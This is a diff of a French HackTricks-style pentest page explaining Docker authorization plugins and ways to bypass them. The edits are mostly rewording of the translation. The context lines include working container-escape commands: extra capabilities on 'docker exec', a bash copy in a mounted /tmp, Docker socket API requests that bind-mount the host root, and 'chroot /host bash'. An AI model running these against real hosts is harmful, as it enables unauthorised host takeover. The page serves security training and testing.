@@ -1,14 +1,14 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
-Le modèle **d'autorisation** de **Docker** est **tout ou rien**. Tout utilisateur ayant la permission d'accéder au démon Docker peut **exécuter n'importe quelle** commande du client Docker. Il en va de même pour les appelants utilisant l'API Engine de Docker pour contacter le démon. Si vous avez besoin d'un **contrôle d'accès** plus **granulaire**, vous pouvez créer des **plugins d'autorisation** et les ajouter à la configuration de votre démon Docker. En utilisant un plugin d'autorisation, un administrateur Docker peut **configurer des politiques d'accès** détaillées pour gérer l'accès au démon Docker.
+Le modèle d'**autorisation** de **Docker** est **tout ou rien**. Tout utilisateur ayant la permission d'accéder au démon Docker peut **exécuter n'importe quelle** commande du client Docker. Il en va de même pour les appelants utilisant l'API Engine de Docker pour contacter le démon. Si vous avez besoin d'un **contrôle d'accès** plus **granulaire**, vous pouvez créer des **plugins d'autorisation** et les ajouter à la configuration de votre démon Docker. En utilisant un plugin d'autorisation, un administrateur Docker peut **configurer des politiques d'accès** détaillées pour gérer l'accès au démon Docker.
 
 # Architecture de base
 
-Les plugins d'authentification Docker sont des **plugins externes** que vous pouvez utiliser pour **autoriser/refuser** les **actions** demandées au démon Docker **en fonction** de l'**utilisateur** qui les a demandées et de l'**action** **demandée**.
+Les plugins d'authentification Docker sont des **plugins externes** que vous pouvez utiliser pour **autoriser/interdire** les **actions** demandées au démon Docker **en fonction** de l'**utilisateur** qui les a demandées et de l'**action** **demandée**.
 
 **[Les informations suivantes proviennent de la documentation](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Lorsqu'une **demande HTTP** est faite au **démon** Docker via la CLI ou via l'API Engine, le **sous-système d'authentification** **transmet** la demande aux **plugins d'authentification** installés. La demande contient l'utilisateur (appelant) et le contexte de la commande. Le **plugin** est responsable de décider s'il faut **autoriser** ou **refuser** la demande.
+Lorsqu'une **demande HTTP** est faite au **démon** Docker via la CLI ou via l'API Engine, le **sous-système d'authentification** **transmet** la demande au(x) **plugin(s)** d'**authentification** installés. La demande contient l'utilisateur (appelant) et le contexte de la commande. Le **plugin** est responsable de décider d'**autoriser** ou d'**interdire** la demande.
 
 Les diagrammes de séquence ci-dessous illustrent un flux d'autorisation d'autorisation et de refus :
 
@@ -16,7 +16,7 @@ Les diagrammes de séquence ci-dessous illustrent un flux d'autorisation d'autor
 
 ![Flux d'autorisation refusé](https://docs.docker.com/engine/extend/images/authz_deny.png)
 
-Chaque demande envoyée au plugin **inclut l'utilisateur authentifié, les en-têtes HTTP et le corps de la demande/réponse**. Seuls le **nom d'utilisateur** et la **méthode d'authentification** utilisée sont transmis au plugin. Plus important encore, **aucune** **information d'identification** ou jetons d'utilisateur ne sont transmis. Enfin, **tous les corps de demande/réponse ne sont pas envoyés** au plugin d'autorisation. Seuls les corps de demande/réponse où le `Content-Type` est soit `text/*` soit `application/json` sont envoyés.
+Chaque demande envoyée au plugin **inclut l'utilisateur authentifié, les en-têtes HTTP et le corps de la demande/réponse**. Seuls le **nom d'utilisateur** et la **méthode d'authentification** utilisée sont transmis au plugin. Plus important encore, **aucune** **information d'identification** ou **jeton** utilisateur n'est transmis. Enfin, **tous les corps de demande/réponse ne sont pas envoyés** au plugin d'autorisation. Seuls les corps de demande/réponse où le `Content-Type` est soit `text/*` soit `application/json` sont envoyés.
 
 Pour les commandes qui peuvent potentiellement détourner la connexion HTTP (`HTTP Upgrade`), comme `exec`, le plugin d'autorisation n'est appelé que pour les demandes HTTP initiales. Une fois que le plugin approuve la commande, l'autorisation n'est pas appliquée au reste du flux. En particulier, les données de streaming ne sont pas transmises aux plugins d'autorisation. Pour les commandes qui renvoient une réponse HTTP en morceaux, comme `logs` et `events`, seule la demande HTTP est envoyée aux plugins d'autorisation.
 
@@ -76,11 +76,11 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-Maintenant, l'utilisateur peut s'échapper du conteneur en utilisant l'une des [**techniques discutées précédemment**](./#privileged-flag) et **escalader les privilèges** à l'intérieur de l'hôte.
+Maintenant, l'utilisateur peut s'échapper du conteneur en utilisant l'une des [**techniques discutées précédemment**](#privileged-flag) et **escalader les privilèges** à l'intérieur de l'hôte.
 
 ## Monter un Dossier Écrivable
 
-Dans ce cas, l'administrateur système **a interdit aux utilisateurs d'exécuter des conteneurs avec le drapeau `--privileged`** ou de donner des capacités supplémentaires au conteneur, et il a seulement autorisé à monter le dossier `/tmp` :
+Dans ce cas, l'administrateur système **a interdit aux utilisateurs d'exécuter des conteneurs avec le drapeau `--privileged`** ou de donner une capacité supplémentaire au conteneur, et il a seulement autorisé à monter le dossier `/tmp` :
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -118,7 +118,7 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 > [!WARNING]
-> Notez comment dans cet exemple nous utilisons le paramètre **`Binds`** comme une clé de niveau racine dans le JSON mais dans l'API, il apparaît sous la clé **`HostConfig`**
+> Notez comment dans cet exemple nous utilisons le **`Binds`** paramètre comme une clé de niveau racine dans le JSON mais dans l'API, il apparaît sous la clé **`HostConfig`**
 
 ### Binds dans HostConfig
 
@@ -126,15 +126,15 @@ Suivez la même instruction qu'avec **Binds dans la racine** en effectuant cette
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-### Montages dans la racine
+### Mounts dans root
 
-Suivez les mêmes instructions que pour **Liens dans la racine** en effectuant cette **demande** à l'API Docker :
+Suivez les mêmes instructions que pour **Binds dans root** en effectuant cette **demande** à l'API Docker :
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
 ### Mounts dans HostConfig
 
-Suivez les mêmes instructions qu'avec **Binds dans root** en effectuant cette **demande** à l'API Docker :
+Suivez les mêmes instructions que pour **Binds dans root** en effectuant cette **demande** à l'API Docker :
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
@@ -169,7 +169,7 @@ docker plugin enable authobot
 ```
 N'oubliez pas de **réactiver le plugin après l'escalade**, sinon un **redémarrage du service docker ne fonctionnera pas** !
 
-## Rapports de contournement du plugin d'authentification
+## Auth Plugin Bypass writeups
 
 - [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
